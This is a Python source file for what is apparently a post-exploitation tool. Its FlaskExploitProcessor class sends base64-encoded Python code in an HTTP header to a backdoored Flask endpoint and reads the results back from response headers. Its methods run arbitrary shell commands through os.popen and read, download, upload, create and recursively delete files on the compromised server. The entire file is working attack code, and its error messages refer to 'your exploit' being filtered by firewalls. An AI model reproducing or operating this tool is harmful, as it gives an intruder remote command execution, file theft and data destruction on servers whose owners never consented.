from pathlib import Path  # get filename
import base64  # encode commands
import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The FlaskExploitProcessor class is an class that accepts commands
        passed into it and processes it to be sent to the backdoored Flask
        endpoint.
        Inherits from the ExploitProcessor class. 
"""
class FlaskExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        self.flask_object = 'Flask'
        super().__init__(host, path, method, header)
        self.name = "Flask"

    """
    @brief Run commands to be interpreted as Python.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        res = self._Base__send_message(
            f"global r;r={self.flask_object}.make_response("
                f"{self.flask_object},'');"
            f"__import__('os').chdir('{self.directory}');\n"
            f"{command}\n"
        )
        return res
    
    """
    @brief Check if a file exists on the server.
    @param name the filename to be checked.
    @return a bool indicating whether or not the file exists.
    @throw CommandException if there is a connection error.
    """
    def __file_exists(self, file: str):
        res = self.__eval(
            f"r.headers['{self.header}']="
                f"int(__import__('os').path.exists('{file}'));")
        return res == '1'

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        res = self.__eval(
            f"r.headers['{self.header}']=f\"{{"
                f"'.'.join(map(str, __import__('sys').version_info[:3]))"
                f"}}|{{"
                f"__import__('pkg_resources')."
                    f"get_distribution('flask').version"
            f"}}\";")
        print("Python Version: " + res.split('|')[0] +
              "\nFlask Version: " + res.split('|')[1])
        
    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(
                f"global r;r={self.flask_object}.make_response("
                    f"{self.flask_object},'');"
                f"r.headers['{self.header}']=__import__('os').getcwd();")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
        
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}":
                            base64.b64encode(message.encode()).decode() }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        res = self.__eval(
            f"r.headers['{self.header}']=__import__('base64').b64encode("
                f"__import__('os').getcwd().encode()).decode();")
        print(base64.b64decode(res).decode())

    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):
        directory = f"'{options}'" if options else ''
        res = self.__eval(
            f"try:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"' '.join(__import__('os').listdir({directory})).encode()"
                f");\n"
            f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"str(e).encode());")
        print(base64.b64decode(res).decode())

    """
    @brief See base class for details.
    """
    def _Base__run(self, command: str):
        encoded = base64.b64encode(command.encode()).decode()
        res = self.__eval(
            f"try:\n"
                f"\tr.headers['{self.header}']="
                    f"__import__('base64').b64encode("
                        f"__import__('os').popen("
                            f"__import__('base64').b64decode("
                                f"b'{encoded}').decode()"
                    f").read().encode()).decode();\n"
            f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"str(e).encode());")
        print(base64.b64decode(res).decode(), end='')

    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        res = self.__eval(
            f"try:\n"
                f"\t__import__('os').chdir('{options}');"
                f"r.headers['{self.header}']=__import__('base64').b64encode("
                    f"__import__('os').getcwd().encode()).decode();\n"
            f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"str(e).encode());")
        self.directory = base64.b64decode(res).decode()
        print(self.directory)

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        res = self.__eval(
            f"try:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"open('{options}', 'r').read().encode()).decode();\n"
        f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64').b64encode("
                    f"str(e).encode());")
        print(base64.b64decode(res.encode()).decode())
    """
    @brief See base class for details.
    """
    def _Base__download(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to download.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            message = (
                f"global r;\n"
                f"try:"
                    f"\t__import__('os').chdir('{self.directory}');"
                    f"r={self.flask_object}.make_response("
                    f"{self.flask_object},open('{options}', 'r').read());"
                    f"r.headers['{self.header}']='Done.';\n"
                f"except Exception as e:\n"
                    f"\tr.headers['{self.header}']=__import__('base64')."
                    f"b64encode(str(e).encode());")
            print("Downloading file...")
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}":
                            base64.b64encode(message.encode()).decode() }
            )
            data = response.content
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            if response.headers[self.header] == 'Done.':
                path = Path('downloads/' + Path(options).name)
                path.parent.mkdir(parents=True, exist_ok=True)
                with open(path, "wb") as bin_file:
                    bin_file.write(data)

            print(response.headers[self.header])
        except:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__upload(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to upload.")
        local_file_path = Path(options)
        if not local_file_path.exists():
            raise CommandException("File does not exist.")
        if not local_file_path.is_file():
            raise CommandException("File is not a file.")
        
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            if (self.__file_exists(local_file_path.name)):
                choice = input("Override existing file? [y/N] ")
                if not choice.lower().startswith('y'):
                    return
                
            message = (
                f"global r;\n"
                f"try:"
                    f"\t__import__('os').chdir('{self.directory}');"
                    f"r={self.flask_object}.make_response("
                    f"{self.flask_object},'');"
                    f"open('{options}','wb').write("
                        f"request.get_data(cache=False));"
                    f"r.headers['{self.header}']='RG9uZS4=';\n"
                f"except Exception as e:\n"
                    f"\tr.headers['{self.header}']=__import__('base64')."
                    f"b64encode(str(e).encode());")
            print("Uploading file...")
            binary = local_file_path.read_bytes()

            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}":
                            base64.b64encode(message.encode()).decode() },
                data=binary
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")

            print(base64.b64decode(response.headers[self.header]
                                   .encode())
                                   .decode())
        except:
            raise CommandException(f"Message was not successfully processed.")

    """
    @brief See base class for details.
    """
    def _Base__rm(self, options: str):
        res = self.__eval(
            f"try:\n"
                f"\tif __import__('os').path.isdir('{options}'):\n"
                    f"\t\t__import__('shutil').rmtree('{options}');\n"
                f"\telse:\n"
                    f"\t\t__import__('pathlib').Path.unlink('{options}');\n"
                f"\tr.headers['{self.header}']='RG9uZS4='\n"
            f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64')."
                f"b64encode(str(e).encode());"
        )
        print(base64.b64decode(res.encode()).decode())

    """
    @brief See base class for details.
    """
    def _Base__mkdir(self, options: str):
        res = self.__eval(
            f"try:\n"
                f"\t__import__('os').makedirs('{options}',exist_ok=True);"
                f"\tr.headers['{self.header}']='RG9uZS4='\n"
            f"except Exception as e:\n"
                f"\tr.headers['{self.header}']=__import__('base64')."
                f"b64encode(str(e).encode());"
        )
        print(base64.b64decode(res.encode()).decode())
